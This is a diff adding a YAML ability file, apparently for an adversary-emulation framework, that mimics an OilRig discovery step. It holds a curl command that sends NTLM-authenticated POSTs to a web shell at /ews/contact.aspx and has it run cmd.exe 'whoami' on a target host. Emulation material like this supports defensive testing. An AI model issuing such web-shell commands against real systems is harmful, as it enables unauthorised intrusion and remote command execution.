@@ -1,0 +1,32 @@
+ability_id: 87d3322b-a435-47b5-9f97-a8db4f86dad5
+access: {}
+additional_info: {}
+buckets:
+- discovery
+delete_payload: true
+description: Attacker machine obtains user from current session gosta's current session
+  on 10.1.0.6
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}'
+    -k -X POST --data "pro=cmd.exe" --data "cmd=whoami" https://#{second.target.ip}/ews/contact.aspx
+  language: null
+  name: sh
+  parsers: []
+  payloads: []
+  platform: linux
+  timeout: 60
+  uploads: []
+  variations: []
+name: OilRig Current User (Kali Agent)
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: discovery
+technique_id: T1033
+technique_name: System Owner/User Discovery
